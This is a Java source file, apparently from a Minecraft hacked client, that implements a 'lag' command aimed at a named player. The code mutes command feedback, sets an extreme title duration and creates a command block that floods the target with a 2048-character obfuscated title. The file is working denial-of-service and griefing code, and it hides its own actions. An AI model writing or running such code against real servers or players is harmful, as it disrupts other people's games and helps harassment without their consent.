package net.shadow.feature.command;

import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.util.Identifier;
import net.minecraft.util.registry.Registry;
import net.shadow.Shadow;
import net.shadow.feature.base.Command;
import java.util.List;
import net.shadow.utils.ChatUtils;
import net.shadow.utils.PlayerUtils;
import net.shadow.utils.Utils;

public class LagCmd extends Command {
    public LagCmd() {
        super("lag", "test command");
    }

    @Override
    public List<String> completions(int index, String[] args){
        if(index == 0){
            return List.of(Utils.getPlayersFromWorld());
        }
        return List.of(new String[0]);
    }

    @Override
    public void call(String[] args) {
        if (args.length < 1) {
            ChatUtils.message("Please use the format >lag <player>");
            return;
        }
        String target = PlayerUtils.completeName(args[0]);
        Shadow.c.getNetworkHandler().sendPacket(new ChatMessageC2SPacket("/gamerule sendCommandFeedback false"));
        Shadow.c.getNetworkHandler().sendPacket(new ChatMessageC2SPacket("/title " + target + " times 0 999999999 0"));
        Shadow.c.getNetworkHandler().sendPacket(new ChatMessageC2SPacket("/gamerule sendCommandFeedback true"));
        Item item = Registry.ITEM.get(new Identifier("command_block"));
        ItemStack stack = new ItemStack(item, 1);
        try {
            stack.setNbt(StringNbtReader.parse("{BlockEntityTag:{Command:\"/title " + target + " title {\\\"text\\\":\\\"" + "l".repeat(2048) + "\\\",\\\"obfuscated\\\":true}\",powered:0b,auto:1b,conditionMet:1b}}"));
        } catch (Exception e) {
            e.printStackTrace();
        }
        Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
        ChatUtils.message("Place the command block");
    }
}
